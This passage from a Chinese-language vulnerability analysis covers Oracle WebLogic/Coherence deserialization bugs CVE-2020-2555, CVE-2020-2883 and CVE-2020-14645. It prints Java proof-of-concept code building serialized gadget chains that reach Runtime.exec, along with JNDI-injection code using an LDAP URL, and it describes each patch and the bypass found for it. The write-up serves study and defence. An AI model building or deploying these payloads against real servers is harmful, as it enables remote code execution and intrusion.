                            "getRuntime", new Class[0]
                    }),
                    new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                    new ReflectionExtractor("exec", new Object[]{new String[]{"calc"}})
            };
            //初始化LimitFiler类实例
            LimitFilter limitFilter = new LimitFilter();
            limitFilter.setTopAnchor(Runtime.class);
            BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
            Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));
            Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
            m_oAnchorTop.setAccessible(true);
            m_oAnchorTop.set(limitFilter, Runtime.class);
            //将limitFilter放入BadAttributeValueExpException的val属性中
            Field val = expException.getClass().getDeclaredField("val");
            val.setAccessible(true);
            val.set(expException, limitFilter);
            //生成序列化payload
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(System.getProperty("user.dir")+"/poc2.ser"));
            objectOutputStream.writeObject(expException);
            objectOutputStream.close();
        }
    }
### CVE-2020-2555补丁
本地补丁检测方式：
    cd %Oracle_Home%/Middleware/wlserver/server/lib
    java -cp weblogic.jar weblogic.version
可以看到，Oracle官方在一月发布了CVE-2020-2555的补丁[[5]](https://support.oracle.com/portal/oracleSearch.html?CVE-2020-2555
"\[5\]")。
该补丁需要用户持有正版软件的许可账号，使用该账号登陆官方网站方可下载。
该补丁阻断了LimitFilter传入的对象使用extract方法.
### CVE-2020-2883
后续 VNPT ISC的研究员Quynh Le向ZDI提交了一个漏洞][6]
该补丁阻断了LimitFilter，也就是阻断了从readObject ---> `toString ----> extract`的路径
然而该研究员找到了另一个路径去连接readObject ----> extract
java.util.PriorityQueue.readObject
    java.util.PriorityQueue.readObject()
       java.util.PriorityQueue.heapify()
       java.util.PriorityQueue.siftDown()
       java.util.PriorityQueue.siftDownUsingComparator()
       com.tangosol.util.extractor.ExtractorComparator.compare()
           com.tangosol.util.extractor.ChainedExtractor.extract()
             //...
             Method.invoke()
                 //...
               Runtime.exec()
java.util.PriorityQueue#readObject会调用heapify函数，如下图，具体利用时使用双参构造方法，我们看看文档的描述。
使用指定的初始容量创建一个 `PriorityQueue`，并 **根据指定的比较器** 对元素进行排序。
这里我们指定的比较器是 ExtractorComparator ，初始容量为2
> PriorityQueue queue = new PriorityQueue(2, new
> ExtractorComparator(chainedExtractor1));
显而易见，这里我们调用的`ExtractorComparator`这个比较器compare函数存在着extract方法。
o1和o2的值：
让m_extractor对象使用extract方法。这里操控m_extractor的方法就是反射（具体前面有）。
于是乎，和前面一样的，这个m_extractor对象被修改为数组以达到多个对象调用extract方法。然后就进入到com.tangosol.util.extractor.ChainedExtractor。
至此，完成了从readObject ---> compare ----> extract的连接。后续调用就和CVE-2020-2555相同了。
调用链：
POC可以参考
### CVE-2020-2883补丁
Oracle官方对于CVE-2020-2883的补丁[7]将 extract 方法存在危险操作的 MvelExtractor 和
ReflectionExtractor 两个类加入到了黑名单中(ReflectionExtractor与MvelExtractor
有反射的extract函数)。
    java.util.PriorityQueue.readObject()
       java.util.PriorityQueue.heapify()
       java.util.PriorityQueue.siftDown()
       java.util.PriorityQueue.siftDownUsingComparator()
       com.tangosol.util.extractor.AbstractExtractor.compare()
         com.tangosol.util.extractor.MultiExtractor.extract()
           com.tangosol.util.extractor.ChainedExtractor.extract()
              com.tangosol.util.extractor.ReflectionExtractor().extract()//patch of 2020-2883
                 Method.invoke()
             //...
             Method.invoke()
                 //...
               Runtime.exec()
### CVE-2020-14645
ReflectionExtractor与MvelExtractor
被加入了黑名单，如果我们能找到一个类（类的extract函数中有可控的反射操作)，便可继续该链条（这里我们有的是readObject --->
compare ----> extract ---> 多个类的extract --> ~~extract中可控反射~~ ）。
可采用这个类com.tangosol.util.extractor.UniversalExtractor#extract。
遗憾的是其被transient修饰，被transient关键字修饰的变量不再能被序列化。
但是此处在75行对oTarget传入了extractComplex方法。
又见希望，该方法中也存在可控反射。
值得注意的是，两条method获取方法只能从第一个if去取，原因是else中需要确保`fProperty==false`,
然而184行中m_fMethod存在transient修饰，被transient关键字修饰的变量不再能被序列化因此无法构建序列化字节流。
而在if条件中收到参数影响有`sBeanAttribute-->
sCName--->this.getCanonicalName()`，这里做的工作就是187行对sCName首字母大写并将其与BEAN_ACCESSOR_PREFIXES列表的值进行拼接，取到则停止返回method。
那么`BEAN_ACCESSOR_PREFIXES`列表是什么样的呢？其存储了get和is两个字符串。因此，在拼接的时候，只能形成get___或者is___这样的方法调用。
于是可以利用
com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData()方法进行反射调用构建JNDI注入，这也是为什么之前都是利用原有的ReflectionExtractor直接反射到Runtime类执行而这里却只能发起JNDI请求在低版本的JDk来执行代码。
**POC逻辑**
在POC构造上，先初始化JDBC对象，设置this.m_sName参数为getDatabaseMetaData()
    JdbcRowSetImpl rowSet = new JdbcRowSetImpl();rowSet.setDataSourceName("ldap://127.0.0.1:1389/#Calc");
    UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);
然后是关键点的sName会被去掉前缀，因此后面要进行拼接。
依旧让queue使用ExtractorComparator这个比较器。
    final ExtractorComparator comparator = new ExtractorComparator(extractor);
    final PriorityQueue queue = new PriorityQueue(2, comparator);
对该queue实例设置成员变量(反射)。此处让该实例queue拥有两个成员变量，一个是queue，值为new Object[]{rowSet,
rowSet}，一个是size，值为2。这里用了写的Reflections工具类，当然也可以一点点用反射进行设置。
    Reflections.setFieldValue(queue, "queue", new Object[]{rowSet, rowSet});
    Reflections.setFieldValue(queue, "size", 2);
POC可以参考
收到的LDAP请求：
该CVE漏洞利用服务器有JDK条件，且只能在Weblogic Server 12.2.1.4.*存在。
> LDAP： 
[2]官方下载
[3]官方安装指引
[4] JAVA 反射
[5]patch for CVE-2020-2555
[6]Quynh Le向ZDI提交漏洞
[7]patch for CVE-2020-2883
* * *